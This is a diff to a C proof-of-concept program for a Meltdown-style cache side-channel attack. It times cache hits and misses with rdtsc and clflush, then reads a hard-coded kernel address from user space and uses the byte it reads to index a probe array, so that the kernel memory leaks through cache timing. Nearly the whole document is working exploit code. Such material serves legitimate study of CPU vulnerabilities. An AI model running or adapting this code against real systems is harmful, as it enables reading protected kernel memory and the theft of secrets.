@@ -19,7 +19,7 @@ static inline unsigned long long rdtsc(void)
 	asm volatile (
 		"mfence\n\t"
 		"rdtsc\n\t"
-		"lfence\n\t"
+		"mfence\n\t"
 		: "=a" (low), "=d" (high)
 	);
 	return ((low) | (high) << 32);
@@ -35,6 +35,7 @@ static inline void clflush(volatile void *__p)
 
 
 #define wmb()	asm volatile ("sfence" ::: "memory")
+#define mb()	asm volatile ("mfence" ::: "memory")
 
 static inline void clflush_buffer(void *vaddr, unsigned int size)
 {
@@ -113,6 +114,7 @@ static void init_probe_array(void)
 		int *ptr, foo;
 		unsigned long start_1, end_1, diff_1;
 		unsigned long start_2, end_2, diff_2;
+		unsigned long start_3, end_3, diff_3;
 
 		ptr = (int *)(probe_array + i);
 
@@ -125,33 +127,22 @@ static void init_probe_array(void)
 		end_1 = rdtsc();
 		diff_1 = end_1 - start_1;
 
-		printf(" %#4x %p %lu\n", i, ptr, diff_1);
-#if 0
-		start_1 = rdtsc();
+		/* cache hit latency */
+		start_2 = rdtsc();
 		foo = *ptr;
-		end_1 = rdtsc();
-		diff_1 = end_1 - start_1;
-		printf(" %#4x %p %lu\n", i, ptr, diff_1);
+		end_2 = rdtsc();
+		diff_2 = end_2 - start_2;
 
-		start_1 = rdtsc();
-		foo = *ptr;
-		end_1 = rdtsc();
-		diff_1 = end_1 - start_1;
-		printf(" %#4x %p %lu\n", i, ptr, diff_1);
-
+		/* cache miss latency */
 		clflush_buffer(ptr, PAGE_SIZE);
-		start_1 = rdtsc();
+		start_3 = rdtsc();
 		foo = *ptr;
-		end_1 = rdtsc();
-		diff_1 = end_1 - start_1;
-		printf(" %#4x %p %lu\n", i, ptr, diff_1);
+		end_3 = rdtsc();
+		diff_3 = end_3 - start_3;
 
-		start_1 = rdtsc();
-		foo = *ptr;
-		end_1 = rdtsc();
-		diff_1 = end_1 - start_1;
-		printf(" %#4x %p %lu\n\n", i, ptr, diff_1);
-#endif
+		printf(" %#4x %p %8lu %8lu %8lu\n",
+			i, ptr, diff_1, diff_2, diff_3);
+
 		clflush_buffer(ptr, PAGE_SIZE);
 	}
 	clflush_buffer(probe_array, PAGE_SIZE * MAX_INDEX);
@@ -159,26 +150,25 @@ static void init_probe_array(void)
 
 int main(void)
 {
-	int index;
+	char index;
 	unsigned long victim_address, unused;
 
 	install_signal_handler();
 	init_probe_array();
 
-	victim_address = 0xffffffff81d96cea;
+	victim_address = 0xffffffff81d96d27;
 
-	unused = *(unsigned long *)(probe_array + 0x60);
-	asm volatile (
-		"	xorq	%%rbx, %%rbx\n\t"	/* clear %rbx */
-		"	movq	%1, %%rax\n\t"
-		"	movb	(%%rax), %%bl\n\t"	/* read kernel byte %rbx */
-		"	shlq	$0xc, %%rbx\n\t"	/* %rbx << 12 */
-		"	addq	%%rbx, %%rcx\n\t"	/* probe_array + (%rbx<<12) */
-		"	movq	(%%rcx), %0\n\t"
-		: "=r" (unused)
-		: "r"(victim_address), "c" (probe_array)
-		: "rbx", "rax"
-	);
+#if 0
+	/*
+	 * Used to debug
+	 * You can clearly see that 0x55 will be detected by signal handler
+	 */
+	unused = *(unsigned long *)(probe_array + (unsigned int)0x55);
+#endif
+
+	mb();
+	index = *(char *)victim_address;
+	unused = *(unsigned long *)(probe_array + (unsigned int)index);
 
 	for (;;)
 		;
